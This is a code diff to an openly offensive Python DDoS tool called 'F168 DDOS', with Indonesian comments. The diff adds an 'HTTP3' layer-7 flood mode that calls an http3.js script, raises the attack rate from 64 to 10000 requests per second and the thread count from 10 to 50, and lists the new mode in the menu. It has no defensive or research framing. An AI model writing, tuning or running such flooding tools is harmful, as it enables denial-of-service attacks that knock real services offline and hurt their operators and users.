@@ -61,7 +61,7 @@ class AttackManager:
             sys.exit(1)
 
         # Periksa script-script yang diperlukan
-        required_scripts = ["mix.js", "hold.js", "wolfme.js"]
+        required_scripts = ["mix.js", "hold.js", "wolfme.js", "http3.js"]
         for script in required_scripts:
             script_path = os.path.join(CONFIG["ATTACK_PATH"], script)
             if not os.path.exists(script_path):
@@ -73,7 +73,8 @@ class AttackManager:
         attack_scripts = {
             "TLS": "hold.js",
             "FLOOD": "wolfme.js",
-            "HOLD": "mix.js"
+            "HOLD": "mix.js",
+            "HTTP3": "http3.js"
         }
         
         script = attack_scripts.get(attack_type.upper())
@@ -84,8 +85,8 @@ class AttackManager:
         script_path = os.path.join(CONFIG["ATTACK_PATH"], script)
         
         # Parameter yang dioptimasi
-        rate = "64"  # requests per detik
-        threads = "10"  # jumlah thread
+        rate = "10000"  # requests per detik
+        threads = "50"  # jumlah thread
         
         try:
             # Validasi waktu
@@ -117,7 +118,7 @@ def help_menu():
                              {Colors.ORANGE}Stay To ↓ For Update
                               ~ F168 DDOS v{CONFIG['VERSION']}
                          {Colors.GREEN}• {Colors.GREEN}HOLD {Colors.GREEN}[{Colors.GREEN}L7]    • FLOOD  {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}] 
-                         • TLS   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
+                         • TLS   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    • HTTP3   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
                          •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -    {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
                          •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -    {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
 
